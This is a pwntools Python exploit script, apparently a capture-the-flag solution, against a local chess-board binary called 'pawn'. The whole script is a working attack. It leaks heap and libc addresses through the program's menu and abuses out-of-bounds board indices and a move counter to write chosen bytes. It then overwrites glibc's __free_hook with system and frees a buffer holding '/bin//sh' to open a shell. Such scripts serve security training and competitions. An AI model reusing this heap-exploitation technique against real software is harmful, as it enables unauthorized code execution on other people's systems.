from pwn import *

p = process("./pawn")
m = lambda: p.recvuntil("Delete Board\n")
gdb.attach(p)
# leak
m()
p.sendline("1")
p.sendlineafter("?\n", "0")
m()
p.sendline("1")
p.sendlineafter("?\n", "1")
m()
p.sendline("5")
p.sendlineafter("?\n", "0")
m()
p.sendline("5")
p.sendlineafter("?\n", "1")
m()
p.sendline("2")
p.sendlineafter("?\n", "1")
p.recvuntil("0 ")
board0 = u64(p.recvuntil("\n")[:-1].ljust(8, b"\x00"))
heap = board0 - 0x12b0
pieces0 = board0 + 0x50
board1 = board0 + 0xa0
pieces1 = board1 + 0x50
starting = 0x404020
moves = 0
# more rooks
flip = 1
for i in range(8):
	for t in range(256):
		if t == ord('R'):
			m()
			p.sendline("4")
			p.sendlineafter("?\n", "0")
			p.sendlineafter(".\n", f"{starting - pieces0 + i} {0}")
			m()
			p.sendline("4")
			p.sendlineafter("?\n", "0")
			p.sendlineafter(".\n", f"{starting - pieces0 + 9 + i} {0}")
		elif t == ord('r'):
			m()
			p.sendline("4")
			p.sendlineafter("?\n", "0")
			p.sendlineafter(".\n", f"{starting - pieces0 + 9*7 + i} {0}")
			m()
			p.sendline("4")
			p.sendlineafter("?\n", "0")
			p.sendlineafter(".\n", f"{starting - pieces0 + 9*6 + i} {0}")
		m()
		p.sendline("3")
		p.sendlineafter("?\n", "0")
		p.sendlineafter(".\n", f"{7 + (1 - flip)} {7}")
		p.sendlineafter(".\n", f"{7 + flip} {7}")
		flip = 1 - flip
		moves += 1

m()
p.sendline("1")
p.sendlineafter("?\n", "0")
m()
p.sendline("1")
p.sendlineafter("?\n", "0")
m()
p.sendline("1")
p.sendlineafter("?\n", "0")
m()
p.sendline("1")
p.sendlineafter("?\n", "1")
m()
p.sendline("5")
p.sendlineafter("?\n", "1")
m()
p.sendline("3")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{7} {7}")
p.sendlineafter(".\n", f"{9} {7}")
moves += 1
m()
p.sendline("3")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{9} {7}")
p.sendlineafter(".\n", f"{9+8} {7}")
moves += 1
for i in range(3):
	m()
	p.sendline("3")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{9+8+i} {7}")
	p.sendlineafter(".\n", f"{9+8+i+1} {7}")
	moves += 1
target = 0x602130
flip = 1
while moves%256 != 0x00:
	m()
	p.sendline("3")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{0 - (1 - flip)} {0}")
	p.sendlineafter(".\n", f"{0 - flip} {0}")
	flip = 1 - flip
	moves += 1
m()
p.sendline("4")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{9+8+3} {7}")
m()
p.sendline("3")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{6} {7}")
p.sendlineafter(".\n", f"{9+8+2} {7}")
moves += 1
while moves%256 != 0x40:
	m()
	p.sendline("3")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{0 - (1 - flip)} {0}")
	p.sendlineafter(".\n", f"{0 - flip} {0}")
	flip = 1 - flip
	moves += 1
m()
p.sendline("4")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{9+8+2} {7}")
m()
p.sendline("3")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{5} {7}")
p.sendlineafter(".\n", f"{9+8+1} {7}")
moves += 1
while moves%256 != 0x3f:
	m()
	p.sendline("3")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{0 - (1 - flip)} {0}")
	p.sendlineafter(".\n", f"{0 - flip} {0}")
	flip = 1 - flip
	moves += 1
m()
p.sendline("4")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{9+8+1} {7}")
m()
p.sendline("3")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{4} {7}")
p.sendlineafter(".\n", f"{9+8} {7}")
moves += 1
while moves%256 != 0x98:
	m()
	p.sendline("3")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{0 - (1 - flip)} {0}")
	p.sendlineafter(".\n", f"{0 - flip} {0}")
	flip = 1 - flip
	moves += 1
m()
p.sendline("4")
p.sendlineafter("?\n", "0")
p.sendlineafter(".\n", f"{9+8} {7}")

m()
p.sendline("2")
p.sendlineafter("?\n", "1")
p.recvuntil("0 ")
leak = u64(p.recvuntil("\n")[:-1].ljust(8, b"\x00"))
libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
base = leak - libc.symbols['free']
print(hex(base))
system = base + libc.symbols['system']
freehook = base + libc.symbols['__free_hook']

print(hex(freehook))
for i, b in enumerate(reversed(p64(freehook)[2:6])):
	print(hex(b))
	m()
	p.sendline("3")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{3-i} {7}")
	p.sendlineafter(".\n", f"{9+8+2+(3-i)} {7}")
	print(p.recvuntil("."))
	moves += 1
	while moves%256 != b:
		m()
		p.sendline("3")
		p.sendlineafter("?\n", "0")
		p.sendlineafter(".\n", f"{0 - (1 - flip)} {0}")
		p.sendlineafter(".\n", f"{0 - flip} {0}")
		flip = 1 - flip
		moves += 1
	m()
	p.sendline("4")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{9+8+2+(3-i)} {7}")
	print(p.recvuntil("."))

print(hex(freehook))
for i, b in enumerate(reversed(p64(freehook)[0:2])):
	print(hex(b))
	m()
	p.sendline("3")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{7-i} {6}")
	p.sendlineafter(".\n", f"{9+9+8+(1-i)} {6}")
	print(p.recvuntil("."))
	moves += 1
	while moves%256 != b:
		m()
		p.sendline("3")
		p.sendlineafter("?\n", "0")
		p.sendlineafter(".\n", f"{0 - (1 - flip)} {0}")
		p.sendlineafter(".\n", f"{0 - flip} {0}")
		flip = 1 - flip
		moves += 1
	m()
	p.sendline("4")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{9+9+8+(1-i)} {6}")
	print(p.recvuntil("."))
m()
p.sendline("1")
p.sendlineafter("?\n", "0")
for i, b in enumerate(p64(system)):
	while moves%256 != b:
		m()
		p.sendline("3")
		p.sendlineafter("?\n", "1")
		p.sendlineafter(".\n", f"{0 - (1 - flip)} {7}")
		p.sendlineafter(".\n", f"{0 - flip} {7}")
		flip = 1 - flip
		moves += 1
	m()
	p.sendline("4")
	p.sendlineafter("?\n", "0")
	p.sendlineafter(".\n", f"{i} {0}")
	print(p.recvuntil("."))
p.sendline("1")
p.sendlineafter("?\n", "3")
for i, b in enumerate(b"/bin//sh"):
	while moves%256 != b:
		m()
		p.sendline("3")
		p.sendlineafter("?\n", "1")
		p.sendlineafter(".\n", f"{0 - (1 - flip)} {7}")
		p.sendlineafter(".\n", f"{0 - flip} {7}")
		flip = 1 - flip
		moves += 1
	m()
	p.sendline("4")
	p.sendlineafter("?\n", "3")
	p.sendlineafter(".\n", f"{i} {0}")
	print(p.recvuntil("."))
m()
p.sendline("5")
p.sendlineafter("?\n", "3")

p.interactive()
